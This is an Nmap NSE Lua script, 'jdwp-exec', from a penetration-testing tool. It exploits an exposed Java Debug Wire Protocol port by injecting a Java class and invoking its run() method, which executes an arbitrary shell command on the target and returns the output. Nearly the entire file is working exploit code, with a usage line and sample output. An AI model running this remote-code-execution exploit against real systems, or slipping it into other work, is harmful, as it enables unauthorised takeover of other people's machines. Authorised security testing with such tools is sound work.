local bin = require "bin"
local io = require "io"
local jdwp = require "jdwp"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"

description = [[
Attempts to exploit java's remote debugging port. When remote debugging
port is left open, it is possible to inject java bytecode and achieve
remote code execution.  This script abuses this to inject and execute
a Java class file that executes the supplied shell command and returns
its output.

The script injects the JDWPSystemInfo class from 
nselib/jdwp-class/ and executes its run() method which 
accepts a shell command as its argument.

]]

---
-- @usage nmap -sT <target> -p <port> --script=+jdwp-exec --script-args cmd="date"
--
-- @args jdwp-exec.cmd 	Command to execute on the remote system.
--
-- @output 
-- PORT     STATE SERVICE REASON
-- 2010/tcp open  search  syn-ack
-- | jdwp-exec:
-- |   date output:
-- |   Sat Aug 11 15:27:21 Central European Daylight Time 2012
-- |_

author = "Aleksandar Nikolic"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","intrusive"}

portrule = function(host, port)
        -- JDWP will close the port if there is no valid handshake within 2
	-- seconds, Service detection's NULL probe detects it as tcpwrapped.
        return port.service == "tcpwrapped"
               and port.protocol == "tcp" and port.state == "open"
               and not(shortport.port_is_excluded(port.number,port.protocol))
end

action = function(host, port)
	stdnse.sleep(5) -- let the remote socket recover from connect() scan
	local status,socket = jdwp.connect(host,port) -- initialize the connection
	if not status then
		stdnse.print_debug("error, %s",socket)
		return nil
	end

	-- read .class file 
	local file = io.open(nmap.fetchfile("nselib/data/jdwp-class/JDWPExecCmd.class"), "rb")
	local class_bytes = file:read("*all")
	
	-- inject the class
	local injectedClass
	status,injectedClass = jdwp.injectClass(socket,class_bytes)
	if not status then
		stdnse.print_debug(1, "%s: Failed to inject class", SCRIPT_NAME)
		return stdnse.format_output(false, "Failed to inject class")
	end
	-- find injected class method
	local runMethodID = jdwp.findMethod(socket,injectedClass.id,"run",false)
	
	if runMethodID == nil then
		stdnse.print_debug(1, "%s: Couldn't find run method", SCRIPT_NAME)
		return stdnse.format_output(false, "Couldn't find run method.")
	end	
	-- set run() method argument 
	local cmd = stdnse.get_script_args(SCRIPT_NAME .. '.cmd')
	if cmd == nil then 
		return stdnse.format_output(false, "This script requires a cmd argument to be specified.")
	end
	local cmdID
	status,cmdID = jdwp.createString(socket,0,cmd)
	if not status then
		stdnse.print_debug(1, "%s: Couldn't create string", SCRIPT_NAME)
		return stdnse.format_output(false, cmdID)
	end
	local runArgs = bin.pack(">CL",0x4c,cmdID)	-- 0x4c is object type tag
	-- invoke run method
	local result 	
	status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,1,runArgs) 
	if not status then
		stdnse.print_debug(1, "%s: Couldn't invoke run method", SCRIPT_NAME)
		return stdnse.format_output(false, result)
	end
	-- get the result string
	local _,_,stringID = bin.unpack(">CL",result)
	status,result = jdwp.readString(socket,0,stringID)	
	return stdnse.format_output(status,result)	
end

